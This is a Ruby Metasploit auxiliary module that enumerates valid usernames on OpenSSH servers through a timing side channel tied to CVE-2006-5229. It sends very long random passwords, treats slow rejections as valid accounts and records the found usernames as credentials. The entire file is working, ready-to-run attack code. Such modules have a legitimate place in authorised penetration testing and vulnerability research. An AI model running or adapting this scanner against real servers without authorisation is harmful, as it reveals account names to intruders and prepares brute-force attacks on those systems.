##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::CommandShell
  include Msf::Exploit::Remote::SSH

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'SSH Username Enumeration',
      'Description' => %q{
        This module uses a time-based attack to enumerate users on an OpenSSH server.
        On some versions of OpenSSH under some configurations, OpenSSH will return a
        "permission denied" error for an invalid user faster than for a valid user.
      },
      'Author'      => ['kenkeiras'],
      'References'  =>
       [
         ['CVE',   '2006-5229'],
         ['OSVDB', '32721'],
         ['BID',   '20418']
       ],
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::Proxies,
        Opt::RPORT(22),
        OptPath.new('USER_FILE',
                    [true, 'File containing usernames, one per line', nil]),
        OptInt.new('THRESHOLD',
                   [true,
                   'Amount of seconds needed before a user is considered ' \
                   'found', 10])
      ], self.class
    )

    register_advanced_options(
      [
        OptInt.new('RETRY_NUM',
                   [true , 'The number of attempts to connect to a SSH server' \
                   ' for each user', 3]),
        OptInt.new('SSH_TIMEOUT',
                   [false, 'Specify the maximum time to negotiate a SSH session',
                   10]),
        OptBool.new('SSH_DEBUG',
                    [false, 'Enable SSH debugging output (Extreme verbosity!)',
                    false])
      ]
    )
  end

  def rport
    datastore['RPORT']
  end

  def retry_num
    datastore['RETRY_NUM']
  end

  def threshold
    datastore['THRESHOLD']
  end

  # Returns true if a nonsense username appears active.
  def check_false_positive(ip)
    user = Rex::Text.rand_text_alphanumeric(8)
    result = attempt_user(user, ip)
    return(result == :success)
  end

  def check_user(ip, user, port)
    pass = Rex::Text.rand_text_alphanumeric(64_000)
    factory = ssh_socket_factory
    opt_hash = {
      :auth_methods  => ['password', 'keyboard-interactive'],
      :port          => port,
      :use_agent     => false,
      :password      => pass,
      :config        => false,
      :proxy         => factory,
      :non_interactive => true
    }

    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']

    start_time = Time.new

    begin
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        Net::SSH.start(ip, user, opt_hash)
      end
    rescue Rex::ConnectionError
      return :connection_error
    rescue Net::SSH::Disconnect, ::EOFError
      return :success
    rescue ::Timeout::Error
      return :success
    rescue Net::SSH::Exception
    end

    finish_time = Time.new

    if finish_time - start_time > threshold
      :success
    else
      :fail
    end
  end

  def do_report(ip, user, port)
    service_data = {
      address: ip,
      port: rport,
      service_name: 'ssh',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: user,
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
    }.merge(service_data)

    create_credential_login(login_data)
  end

  # Because this isn't using the AuthBrute mixin, we don't have the
  # usual peer method
  def peer(rhost=nil)
    "#{rhost}:#{rport} - SSH -"
  end

  def user_list
    if File.readable? datastore['USER_FILE']
      File.new(datastore['USER_FILE']).read.split
    else
      raise ArgumentError, "Cannot read file #{datastore['USER_FILE']}"
    end
  end

  def attempt_user(user, ip)
    attempt_num = 0
    ret = nil

    while attempt_num <= retry_num and (ret.nil? or ret == :connection_error)
      if attempt_num > 0
        Rex.sleep(2 ** attempt_num)
        vprint_status("#{peer(ip)} Retrying '#{user}' due to connection error")
      end

      ret = check_user(ip, user, rport)
      attempt_num += 1
    end

    ret
  end

  def show_result(attempt_result, user, ip)
    case attempt_result
    when :success
      print_good("#{peer(ip)} User '#{user}' found")
      do_report(ip, user, rport)
    when :connection_error
      print_error("#{peer(ip)} User '#{user}' on could not connect")
    when :fail
      print_error("#{peer(ip)} User '#{user}' not found")
    end
  end

  def run_host(ip)
    print_status "#{peer(ip)} Checking for false positives"
    if check_false_positive(ip)
      print_error "#{peer(ip)} throws false positive results. Aborting."
      return
    else
      print_status "#{peer(ip)} Starting scan"
      user_list.each{ |user| show_result(attempt_user(user, ip), user, ip) }
    end
  end

end
